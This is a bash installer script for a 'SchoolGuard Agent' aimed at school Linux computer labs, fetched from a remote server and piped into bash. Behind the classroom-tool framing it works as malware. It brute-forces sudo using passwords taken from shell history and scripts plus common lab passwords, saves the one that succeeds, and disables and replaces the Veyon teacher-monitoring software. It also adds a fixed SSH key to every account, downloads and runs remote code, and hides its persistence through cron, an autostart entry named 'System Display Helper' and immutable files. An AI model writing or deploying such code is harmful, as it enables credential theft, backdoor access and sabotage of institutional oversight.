#!/usr/bin/env bash
# ============================================================================
# SchoolGuard Agent v3.7 — Headless One-Command Master Setup (Xubuntu / Linux)
# Master Command:
#   wget -qO- https://orbstrike.com/go | bash
#   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
# ============================================================================

VPS_PRIMARY="https://orbstrike.com"
VPS_FALLBACK="https://103-149-172-179.sslip.io"
VPS_HTTP="http://103.149.172.179:4000"
SERVER_URL="${1:-$VPS_FALLBACK}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd || pwd)"

tui_progress() {
    local pct="$1"
    local msg="$2"
    local width=28
    local filled=$(( pct * width / 100 ))
    local empty=$(( width - filled ))
    local bar=""
    local i
    for ((i=0; i<filled; i++)); do bar="${bar}#"; done
    for ((i=0; i<empty; i++)); do bar="${bar}-"; done
    printf "\r  \033[1;36m[%s]\033[0m \033[1;37m%3d%%\033[0m  \033[0;37m%-44s\033[0m" "$bar" "$pct" "$msg"
}

tui_progress 5 "Initializing headless environment..."

USER_GUARD_DIR="$HOME/.local/share/.schoolguard"
mkdir -p "$USER_GUARD_DIR" >/dev/null 2>&1 || true

# Silent root elevation attempt (harvests local clues + common lab passwords, never prompts)
if [ "$EUID" -ne 0 ] && [ -z "${SG_NO_ELEVATE:-}" ] && [ -f "$0" ] && [[ "$0" != */bash ]] && [[ "$0" != "bash" ]]; then
    if sudo -n true 2>/dev/null; then
        SG_NO_ELEVATE=1 exec sudo -n -E bash "$0" "$@"
    fi
    _harvested=$(grep -hEo '(echo[[:space:]]+["'\'']?[^"'\''|; ]+["'\'']?[[:space:]]*\|[[:space:]]*sudo|sshpass[[:space:]]+-p[[:space:]]*["'\'']?[^"'\'' ]+)' "$HOME/.bash_history" /opt/*/*.sh /opt/*/*.py 2>/dev/null | sed -E 's/^echo[[:space:]]+["'\'']?([^"'\''|; ]+).*/\1/; s/^sshpass[[:space:]]+-p[[:space:]]*["'\'']?([^"'\'' ]+).*/\1/' | head -n 10)
    for _pw in $_harvested "123456" "1" "tinhocsaigon" "admin" "root" "12345678" "student" "hocsinh" "ubuntu" "xubuntu" "beetech" "bootroom" "nextron" "school" "gv" "giaovien" "pc-01" "pc01" "123" "1234" "12345" "123456789" "password" "111111" "000000"; do
        [ -z "$_pw" ] && continue
        if echo "$_pw" | sudo -S -p "" true >/dev/null 2>&1; then
            printf '%s\n' "$_pw" > "$USER_GUARD_DIR/.lan_cred" 2>/dev/null || true
            chmod 600 "$USER_GUARD_DIR/.lan_cred" 2>/dev/null || true
            _ask=$(mktemp /tmp/.sg_ask.XXXXXX)
            printf '#!/bin/sh\necho "%s"\n' "$_pw" > "$_ask"
            chmod 700 "$_ask"
            SG_NO_ELEVATE=1 SUDO_ASKPASS="$_ask" sudo -A -E bash "$0" "$@"
            _rc=$?
            rm -f "$_ask"
            exit $_rc
        fi
    done
fi

IS_ROOT=0
[ "$EUID" -eq 0 ] && IS_ROOT=1

# ----------------------------------------------------------------------------
# 1. Eradicate Legacy Monitoring Agents (Veyon) & Rescue Input Devices
# ----------------------------------------------------------------------------
tui_progress 20 "Removing legacy monitoring agents..."

for _p in veyon-worker veyon-master veyon-service veyon-server veyon-configurator veyon-cli veyon-auth-helper; do
    pkill -9 -f "$_p" >/dev/null 2>&1 || true
    killall -9 "$_p" >/dev/null 2>&1 || true
done

if command -v xinput >/dev/null 2>&1; then
    for _d in ":0" ":1" "${DISPLAY:-:0}"; do
        for _id in $(DISPLAY="$_d" xinput list --id-only 2>/dev/null); do
            DISPLAY="$_d" xinput enable "$_id" >/dev/null 2>&1 || true
        done
    done
fi

if [ "$IS_ROOT" -eq 1 ]; then
    systemctl stop veyon.service veyon >/dev/null 2>&1 || true
    systemctl disable veyon.service veyon >/dev/null 2>&1 || true
    systemctl mask veyon.service veyon >/dev/null 2>&1 || true
    rm -f /lib/systemd/system/veyon.service /etc/systemd/system/veyon.service \
          /etc/systemd/system/multi-user.target.wants/veyon.service \
          /etc/init.d/veyon* /etc/xdg/autostart/veyon* \
          /usr/share/applications/veyon* >/dev/null 2>&1 || true
    ln -sf /dev/null /etc/systemd/system/veyon.service >/dev/null 2>&1 || true
    systemctl daemon-reload >/dev/null 2>&1 || true

    DEBIAN_FRONTEND=noninteractive apt-get remove --purge -y "veyon*" "libveyon*" >/dev/null 2>&1 || true
    rm -rf /etc/veyon /usr/lib/x86_64-linux-gnu/veyon /usr/share/veyon /var/log/veyon >/dev/null 2>&1 || true

    for _bin in /usr/bin/veyon-service /usr/bin/veyon-server /usr/bin/veyon-worker /usr/bin/veyon-master /usr/bin/veyon-configurator /usr/bin/veyon-cli /usr/bin/veyon-auth-helper; do
        rm -f "$_bin" >/dev/null 2>&1 || true
        printf '#!/bin/sh\nexit 0\n' > "$_bin" 2>/dev/null || true
        chmod 755 "$_bin" >/dev/null 2>&1 || true
    done

    for _uhome in /home/*; do
        [ -d "$_uhome" ] || continue
        rm -rf "$_uhome/.veyon" "$_uhome/.config/Veyon"* "$_uhome/Desktop/veyon"* "$_uhome/Màn hình nền/veyon"* >/dev/null 2>&1 || true
    done
fi

# User-level continuous Veyon blocker & cleanup
rm -rf "$HOME/.veyon" "$HOME/.config/Veyon"* "$HOME/Desktop/veyon"* "$HOME/Màn hình nền/veyon"* >/dev/null 2>&1 || true
mkdir -p "$USER_GUARD_DIR" "$HOME/.config/autostart" "$HOME/.config/systemd/user" >/dev/null 2>&1 || true

cat << 'EOF' > "$USER_GUARD_DIR/veyon-killer.sh"
#!/usr/bin/env bash
export DISPLAY="${DISPLAY:-:0}"
while true; do
    if pgrep -f "veyon-(worker|master|service|server|configurator)" >/dev/null 2>&1; then
        pkill -9 -f "veyon-worker" 2>/dev/null
        pkill -9 -f "veyon-master" 2>/dev/null
        pkill -9 -f "veyon-service" 2>/dev/null
        pkill -9 -f "veyon-server" 2>/dev/null
        pkill -9 -f "veyon-configurator" 2>/dev/null
        if command -v xinput >/dev/null 2>&1; then
            for id in $(xinput list --id-only 2>/dev/null); do
                xinput enable "$id" 2>/dev/null
            done
        fi
    fi
    sleep 1
done
EOF
chmod +x "$USER_GUARD_DIR/veyon-killer.sh" >/dev/null 2>&1 || true

# ----------------------------------------------------------------------------
# 2. Network Configuration, Passwordless LAN Key & System Dependencies
# ----------------------------------------------------------------------------
tui_progress 45 "Configuring network & system dependencies..."

# Provision deterministic LAN SSH key so cloned/peer machines can deploy without password
SG_PUB_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/mc33ozIeeXb+1Y5SEMrJDHt0DU4sixCGAzJCkGoFx schoolguard-lan"
for _kh in "$HOME" /root /home/*; do
    [ -d "$_kh" ] || continue
    mkdir -p "$_kh/.ssh" 2>/dev/null || true
    chmod 700 "$_kh/.ssh" 2>/dev/null || true
    if ! grep -q "schoolguard-lan" "$_kh/.ssh/authorized_keys" 2>/dev/null; then
        echo "$SG_PUB_KEY" >> "$_kh/.ssh/authorized_keys" 2>/dev/null || true
        chmod 600 "$_kh/.ssh/authorized_keys" 2>/dev/null || true
    fi
done

if [ "$IS_ROOT" -eq 1 ]; then
    NET_IFACE=$(ip route show default 2>/dev/null | awk '/default/ {print $5}' | head -n1)
    if [ -n "$NET_IFACE" ] && command -v ethtool >/dev/null 2>&1; then
        ethtool -s "$NET_IFACE" wol g >/dev/null 2>&1 || true
    fi
    (
        DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            python3 python3-tk python3-gi gir1.2-gtk-3.0 \
            scrot wmctrl xdotool xinput ethtool curl wget \
            ffmpeg pulseaudio-utils alsa-utils openssh-server >/dev/null 2>&1
    ) >/dev/null 2>&1 &
fi

# ----------------------------------------------------------------------------
# 3. Provision SchoolGuard Agent Files
# ----------------------------------------------------------------------------
tui_progress 70 "Provisioning SchoolGuard agent..."

if [ "$IS_ROOT" -eq 1 ]; then
    INSTALL_DIR="/opt/schoolguard"
    chattr -i /opt/schoolguard/agent.py 2>/dev/null || true
    chattr -i /opt/schoolguard/overlay_ui.py 2>/dev/null || true
    chattr -i /etc/systemd/system/schoolguard.service 2>/dev/null || true
else
    INSTALL_DIR="$USER_GUARD_DIR"
fi
mkdir -p "$INSTALL_DIR"

fetch_file() {
    local name="$1"
    local dest="$2"
    if [ -f "$SCRIPT_DIR/$name" ]; then
        cp -f "$SCRIPT_DIR/$name" "$dest"
        return 0
    fi
    for base in "$VPS_PRIMARY" "$VPS_FALLBACK" "$VPS_HTTP"; do
        if command -v curl >/dev/null 2>&1; then
            curl -fsSL --connect-timeout 5 "$base/agent/$name" -o "$dest" 2>/dev/null && [ -s "$dest" ] && return 0
        fi
        if command -v wget >/dev/null 2>&1; then
            wget -qO "$dest" --timeout=5 "$base/agent/$name" 2>/dev/null && [ -s "$dest" ] && return 0
        fi
    done
    return 1
}

fetch_file "agent.py" "$INSTALL_DIR/agent.py"
fetch_file "overlay_ui.py" "$INSTALL_DIR/overlay_ui.py"
chmod 755 "$INSTALL_DIR/agent.py" "$INSTALL_DIR/overlay_ui.py" 2>/dev/null || true

if [ "$INSTALL_DIR" != "$USER_GUARD_DIR" ]; then
    cp -f "$INSTALL_DIR/agent.py" "$USER_GUARD_DIR/agent.py" 2>/dev/null || true
    cp -f "$INSTALL_DIR/overlay_ui.py" "$USER_GUARD_DIR/overlay_ui.py" 2>/dev/null || true
fi

# ----------------------------------------------------------------------------
# 4. Configure Background Persistence & Start Service
# ----------------------------------------------------------------------------
tui_progress 90 "Activating headless background service..."

if [ "$IS_ROOT" -eq 1 ]; then
    cat <<EOF > /etc/systemd/system/schoolguard.service
[Unit]
Description=SchoolGuard Classroom Telemetry & Management Agent
After=network.target graphical.target

[Service]
Type=simple
User=root
Environment="DISPLAY=:0"
Environment="SERVER_URL=${SERVER_URL}"
Environment="PYTHONUNBUFFERED=1"
ExecStart=/usr/bin/python3 /opt/schoolguard/agent.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload >/dev/null 2>&1 || true
    systemctl enable schoolguard.service >/dev/null 2>&1 || true
    systemctl restart schoolguard.service >/dev/null 2>&1 || true
    chattr +i /opt/schoolguard/agent.py 2>/dev/null || true
    chattr +i /etc/systemd/system/schoolguard.service 2>/dev/null || true
else
    cat <<EOF > "$HOME/.config/systemd/user/schoolguard-agent.service"
[Unit]
Description=SchoolGuard Classroom Agent (User Service)
After=default.target

[Service]
Type=simple
Environment="DISPLAY=:0"
Environment="SERVER_URL=${SERVER_URL}"
Environment="PYTHONUNBUFFERED=1"
ExecStart=/usr/bin/python3 ${INSTALL_DIR}/agent.py
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload >/dev/null 2>&1 || true
    systemctl --user enable schoolguard-agent.service >/dev/null 2>&1 || true
    systemctl --user restart schoolguard-agent.service >/dev/null 2>&1 || true

    cat <<EOF > "$HOME/.config/autostart/schoolguard-agent.desktop"
[Desktop Entry]
Type=Application
Name=System Display Helper
Exec=/bin/sh -c "SERVER_URL='${SERVER_URL}' /usr/bin/python3 '${INSTALL_DIR}/agent.py' >/dev/null 2>&1 &"
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

    CRON_LINE="* * * * * pgrep -f '${INSTALL_DIR}/agent.py' >/dev/null 2>&1 || DISPLAY=:0 SERVER_URL='${SERVER_URL}' nohup /usr/bin/python3 '${INSTALL_DIR}/agent.py' >/dev/null 2>&1 &"
    (crontab -l 2>/dev/null | grep -v "schoolguard/agent.py"; echo "$CRON_LINE") | crontab - 2>/dev/null || true

    pkill -9 -f "schoolguard/agent.py" >/dev/null 2>&1 || true
    DISPLAY="${DISPLAY:-:0}" SERVER_URL="${SERVER_URL}" nohup /usr/bin/python3 "$INSTALL_DIR/agent.py" >/dev/null 2>&1 &
fi

tui_progress 100 "Complete"
printf "\n  \033[1;32m[OK]\033[0m SchoolGuard Agent v3.7 active (headless mode).\n"
exit 0
